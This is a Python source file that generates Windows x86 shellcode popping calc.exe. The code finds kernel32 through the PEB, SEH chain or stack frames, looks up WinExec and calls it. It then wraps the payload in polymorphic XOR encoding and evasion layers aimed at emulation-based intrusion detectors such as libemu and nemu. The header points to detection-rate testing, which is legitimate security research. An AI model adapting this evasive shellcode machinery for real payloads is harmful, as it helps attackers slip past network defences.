#!/usr/bin/python

"""
	Based on: https://code.google.com/p/win-exec-calc-shellcode/
			; Copyright (c) 2009-2013, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
			; and Peter Ferrie <peter.ferrie@gmail.com>
			; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/

	Incorporates kernel32.dll base address resolution heuristic evasion techniques and dummy PEB technique for TP rate testing
	Payloads are armored to evade EBNIDS of choice (with an evasive depth of 1).
	Encoding is done using the poly_dword_xor encoder.
"""

import argparse
from utils.config import encoder_options

# Assembler functionality
from assembler.assembler import assembler

# Conversion functionality
from utils.bytework import bytes_to_asm, translate_bytes
from struct import unpack

# Randomness functionality
from random import choice

# Architecture modules
from arch.core import arch_registers, architectures, dest_index_regs, word_keywords

# Evasion core module
from evader_core.ebnids_evasion import armor_shellcode, ebnids_evasion_encoder

# Payload-related modules
# ======================================
# Kernel32.dll base address resolution
# ======================================
# PEB-based
# --------------------------------------
from payload_modules.kernel32.peb import payload_kernel32_peb
# --------------------------------------
# SEH-walking based
# --------------------------------------
from payload_modules.kernel32.seh_walker import payload_kernel32_seh_walker
# --------------------------------------
# Stackframe-walking based
# --------------------------------------
from payload_modules.kernel32.stackframe_walker import payload_kernel32_stackframe_walker

from evasion_modules.plain.plain import evasion_plain
from encoder_modules.poly_dword_xor import poly_dword_xor

class calc_shellcode:
	def __init__(self):
		return

	#
	# Automatic evasion armor selection
	#
	def armor_payload(self, payload, arch, bits, badchars, evade, depth):
		encoders = [arch+'.poly_dword_xor']
		return armor_shellcode(payload, arch, bits, badchars, evade, depth, encoders, True)

	# 
	# We only want base resolution stub, not full function finding routine etc.
	#
	def build_base_stub(self, approach, arch, bits, badchars, base_reg):
		approaches = {'peb': payload_kernel32_peb,
					  'seh': payload_kernel32_seh_walker,
					  'stack_frame': payload_kernel32_stackframe_walker}

		base_getter = approaches[approach](architectures[arch], bits, badchars)
		return base_getter.get_stub(base_reg)

	def build_shellcode(self, approach, arch, bits, badchars, armor=True, evade=[], depth=1, stack_align=True, platform_independent=False, func=False):
		asm = assembler(architectures[arch], bits)

		base_reg = dest_index_regs[bits]
		kernel32_base_resolution = bytes_to_asm(self.build_base_stub(approach, arch, bits, badchars, base_reg))

		# WinExec *requires* 4 byte stack alignment
		if not(platform_independent):
			listing = 'main:\n'
			if(stack_align):
				listing += "AND SP, 0xFFFC\n"
			if(func):
				listing += 'PUSHAD'

			align_stack = bytes_to_asm(asm.assemble(listing))
		else:
			align_stack = ''

		# Clear EDX
		if not(platform_independent):
			null_instructions = ['XOR', 'SUB']
			null_instr = choice(null_instructions)
			variables = {'null_instr': null_instr}
			listing = 'main:\n{null_instr} EDX, EDX'
			clear_edx = bytes_to_asm(asm.assemble(listing.format(**variables)))
		else:
			clear_edx = ''

		# Restore stack
		if (not(platform_independent) and (func)):
			listing = '''
main:
	    POP EAX
	    POP EAX
	    POPAD
	    RET 
	'''
			restore_stack = bytes_to_asm(asm.assemble(listing))
		else:
			restore_stack = ''

		calc_dword = hex(unpack('<I','calc')[0])
		wine_dword = hex(unpack('<I','WinE')[0])

		word_keyword = word_keywords[bits]
		half_word_keyword = word_keywords[bits / 2]

		# Main shellcode
		variables = {'word_keyword': word_keyword, 'half_word_keyword': half_word_keyword, 'align_stack': align_stack, 'restore_stack': restore_stack, 'clear_edx': clear_edx, 'kernel32_base_resolution': kernel32_base_resolution, 'calc_dword': calc_dword, 'wine_dword': wine_dword}

		listing = '''
main:
	{align_stack}
	{clear_edx}

	PUSH EDX
	PUSH {calc_dword}
	MOV ESI, ESP
	PUSH EDX
	PUSH ESI
	PUSH EDX

	; Stack contains arguments for WinExec

	{kernel32_base_resolution}

	POP EDX

	; Found kernel32 base address (EDI)

	MOV EBX, {word_keyword} PTR [EDI + 0x3C]
    MOV EBX, {word_keyword} PTR [EDI + EBX + 0x18 + 0x60]
    MOV ESI, {word_keyword} PTR [EDI + EBX + 0x20]
    ADD ESI, EDI
    MOV ECX, {word_keyword} PTR [EDI + EBX + 0x24]
    ADD ECX, EDI

find_winexec_x86:
	
	; speculatively load ordinal (EBP)
    MOVZX EBP, {half_word_keyword} PTR [ECX + EDX * 2]
    INC EDX
    LODSD
    CMP {word_keyword} PTR [EDI + EAX], {wine_dword}
    JNZ find_winexec_x86
    MOV ESI, {word_keyword} PTR [EDI + EBX + 0x1C]
    ADD ESI, EDI
    ADD EDI, {word_keyword} PTR [ESI + EBP * 4]

    CALL EDI

    {restore_stack}
	'''

		payload = asm.assemble(listing.format(**variables))

		if(armor):
			res = self.armor_payload(payload, arch, bits, badchars, evade, depth)
		else:
			res = [], payload

		return res

# Command-line argument parsing functionality
class arg_parser(argparse.ArgumentParser):
    def error(self, message):
        print "[-]Error: %s\n" % message
        self.print_help()
        exit()

# Command-line argument parser
def get_arg_parser():
	header = "Evasive generator for universal Windows x86 calc.exe popper by SkyLined & PFerrie"

	parser = arg_parser(description=header)	

	parser.add_argument('--approach', dest='approach', help='list of kernel32.dll base address resolution approaches', default='peb', required=True, choices=['peb', 'seh', 'stack_frame'])
	parser.add_argument('--evade', dest='evade', help='target EBNIDS to evade (or plain or enc options)', default = 'plain', choices=['plain', 'enc', 'libemu', 'nemu'])
	parser.add_argument('--depth', dest='depth', help='number of evaders to chain per target EBNIDS (default: 1)', default=1, type=int)

	parser.add_argument('--arch', dest='architecture', help='architecture (default: x86)', default='x86', choices=['x86'])
	parser.add_argument('--bits', dest='bits', type=int, help='bits (default: 32)', default=32, choices=[32])
	parser.add_argument('--badchars', dest='badchars', help='badchars (in hex format eg. 000a)', default="")

	parser.add_argument('--format', dest='outformat', help='output format', choices=['hex','c','asm','python'], default="hex")

	return parser

def main():
	parser = get_arg_parser()
	args = parser.parse_args()

	cs_gen = calc_shellcode()
	if(args.evade == 'plain'):
		name_chain, enc_p = cs_gen.build_shellcode(args.approach, args.architecture, args.bits, args.badchars.decode('hex'), False)
	elif(args.evade == 'enc'):
		name_chain, enc_p = cs_gen.build_shellcode(args.approach, args.architecture, args.bits, args.badchars.decode('hex'), False)
		evasion_chain = [(args.approach+'.'+args.evade , {'evader': evasion_plain, 'encoder': poly_dword_xor, 'additional_params': {}})]
		ebnids_evade = ebnids_evasion_encoder()
		name_chain, enc_p = ebnids_evade.armor(enc_p, evasion_chain, architectures[args.architecture], args.bits, args.badchars.decode('hex'), False)
	else:
		name_chain, enc_p = cs_gen.build_shellcode(args.approach, args.architecture, args.bits, args.badchars.decode('hex'), True, args.evade, args.depth)

	print "[+]Payload: "
	print translate_bytes(enc_p, args.outformat)

if __name__ == "__main__":
	main()